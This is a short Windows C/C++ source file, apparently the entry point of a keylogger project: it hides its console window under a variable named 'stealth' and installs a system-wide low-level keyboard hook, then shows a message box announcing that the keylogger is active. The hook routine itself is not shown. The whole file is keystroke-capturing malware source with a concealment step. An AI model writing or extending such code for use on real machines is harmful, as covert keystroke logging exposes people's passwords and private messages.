#include "KeyLogger.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) 
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	HHOOK keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL,
		fnKeyboardHookProc,
		hInstance,
		0);
	MessageBoxA(0, "Keylogger is active,press OK to deactivate", "Info", MB_OK);
	return 0;
}